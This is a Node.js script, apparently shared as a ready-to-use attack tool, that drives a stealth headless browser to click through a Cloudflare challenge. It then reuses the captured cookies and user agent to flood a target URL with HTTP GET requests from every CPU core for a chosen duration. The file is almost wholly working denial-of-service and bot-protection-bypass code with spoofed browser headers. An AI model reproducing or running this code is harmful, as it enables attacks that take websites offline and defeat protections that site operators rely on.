const net = require("net");
const http2 = require("http2");
const http = require("http");
const https = require("https");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const { Agent } = require('undici');
const colors = require("colors");
const cloudscraper = require('cloudscraper');
const scp = require("set-cookie-parser");
const randomUseragent = require('random-useragent');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
];
const cache_header = [
    'max-age=0',
    'no-cache',
    'no-store',
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
];
const language_header = [
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8',
];
const fetch_site = [
    "same-origin", "same-site", "cross-site", "none"
];
const fetch_mode = [
    "navigate", "same-origin", "no-cors", "cors"
];
const fetch_dest = [
    "document", "sharedworker", "subresource", "unknown", "worker"
];
const encoding_header = [
    'gzip, deflate, br', 'compress, gzip', 'deflate, gzip', 'gzip, identity'
];
const args = process.argv.slice(2);

if (args.length < 2) {
  return console.log(`Bypass Cloudflare Captcha)
  
Usage: node Browser.js [url] [time]
--proxy proxy.txt`);
}

const target = args[0];
const time = parseInt(args[1], 10);

puppeteer.use(StealthPlugin());

async function visitPage(originalUrl) {
  const browser = await puppeteer.launch({
    headless: true,
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--start-maximized',
      '--disable-infobars',
      '--disable-web-security',
      '--disable-blink-features=AutomationControlled'
    ]
  });

  const page = await browser.newPage();
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edge/91.0.864.59',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.78',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0'
];

// Memilih user-agent secara random
const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
  
  await page.setUserAgent(userAgent);
  await page.setViewport({ width: 1280, height: 800 });

  console.log(`[!] Navigating to URL: ${originalUrl}`);

  try {
    await page.goto(originalUrl, { waitUntil: 'networkidle2' });

    const isCFProtect = await page.evaluate(() => {
      const titleText = document.title.toLowerCase();
      return titleText.includes("just a moment");
    });

    if (isCFProtect) {
      console.log("[-] Detected CF Protection - Initiating bypass");
      const clickX = 219;
      const clickY = 279;

      const intervalId = setInterval(async () => {
        const stillProtected = await page.evaluate(() => {
          const titleText = document.title.toLowerCase();
          return titleText.includes("just a moment");
        });

        if (stillProtected) {
          await page.mouse.click(clickX, clickY);
        } else {
          console.log("[+] Cloudflare Successfully Bypassed");

          const cookies = await page.cookies();
          const cookieHeader = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');

          console.log(`[+] Cookies: ${cookieHeader}`);
          console.log(`[+] User-Agent: ${userAgent}`);
          clearInterval(intervalId);
          console.log(`[+] Starting Flooding To ${target} For ${time} Seconds`);
          flood(target, userAgent, cookieHeader, time);
        }
      }, 3000);
    } else {
      console.log("[+] No CF Protection detected - Proceeding normally");
      console.log(`[+] Starting Flooding To ${target} For ${time} Seconds`);
      flood(target, userAgent, "", time);
    }

  } catch (error) {
    console.error('An error occurred:', error);
  }
}
// Create a basic HTTP/1.1 agent using `undici` for HTTPS requests
const http1_undiciAgent = new Agent({
  keepAliveTimeout: 10,
  maxCachedSessions: 100
});

// Create a basic HTTP/1.1 agent using `http` module for HTTP requests
const http1_1Agent = new http.Agent({
  keepAlive: true,
  keepAliveMsecs: 10000,
  maxSockets: Infinity
});

// Create a basic HTTPS/1.1 agent using `https` module
const https1_1Agent = new https.Agent({
  keepAlive: true,
  keepAliveMsecs: 10000,
  maxSockets: Infinity
});

async function flood(url, userAgent, cookieHeader, time) {
  const endTime = Date.now() + time * 1000;
  const cpuCount = os.cpus().length;

  // Send a basic HTTP/1.1 request using the `http` module (normal connection)
  async function sendRequestHTTP1() {
    const isHTTPS = url.startsWith('https://');  // Check if URL uses HTTPS

    const reqModule = isHTTPS ? https : http; // Choose the appropriate module
    const reqAgent = isHTTPS ? https1_1Agent : http1_1Agent; // Choose the appropriate agent

    const req = reqModule.request(url, {
      method: 'GET',
      headers: {
        'User-Agent': userAgent,
        'Cookie': cookieHeader,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Referer': 'https://www.google.com/',
        'Sec-CH-UA': '"Chromium";v="91", "Google Chrome";v="91", ";Not A Brand";v="99"',
        'Sec-CH-UA-Mobile': '?0',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Dest': 'document',
        'X-Requested-With': 'XMLHttpRequest',
      },
      agent: reqAgent,  // Use the appropriate agent
    }, (res) => {
      res.on('data', () => {});
      res.on('end', () => {});
    });

    req.on('error', (err) => {
      console.error('[Error in HTTP/1 request]:', err.message);
    });

    req.end();
  }

  // Send request using Undici (HTTP/1.1 agent from Undici) for HTTPS
  async function sendRequestHTTP1Undici() {
    try {
      const headers = {
        'User-Agent': userAgent,
        'Cookie': cookieHeader,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Referer': 'https://www.google.com/',
        'Sec-CH-UA': '"Chromium";v="91", "Google Chrome";v="91", ";Not A Brand";v="99"',
        'Sec-CH-UA-Mobile': '?0',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Dest': 'document',
        'X-Requested-With': 'XMLHttpRequest'
      };

      // Directly use Undici for HTTP/1.1 request
      const response = await axios({
        url: url,
        method: 'GET',
        headers: headers,
        httpsAgent: https1_1Agent // Use https.Agent if making HTTPS requests
      });
    } catch (error) {
      console.error('[Error in HTTPS request (Undici)]:', error.message);
    }
  }

  // Flooding requests using multiple cores
  for (let i = 0; i < cpuCount; i++) {
    const intervalId = setInterval(() => {
      if (Date.now() >= endTime) {
        clearInterval(intervalId);
        console.log(`[+] Flood completed for core ${i + 1}`);
      } else {
        // Send requests using both HTTP/1.1 (native) and HTTP/1.1 via Undici concurrently
        sendRequestHTTP1();        // HTTP/1.1 request (native)
        sendRequestHTTP1Undici();  // HTTP/1.1 request (Undici)
      }
    }, 1); // Minimum interval for high-speed requests
  }

  console.log(`[+] Flood started on ${cpuCount} cores for ${time} seconds`);
}

// Jangan lupa panggil fungsi `visitPage` jika itu bagian dari kode Anda

visitPage(target);

// Mengakhiri proses setelah waktu yang ditentukan
setTimeout(() => {
  console.log(`[+] Time is up! Stopping the flood after ${time} seconds.`);
  process.exit(0); // Mengakhiri proses
}, time * 1000);
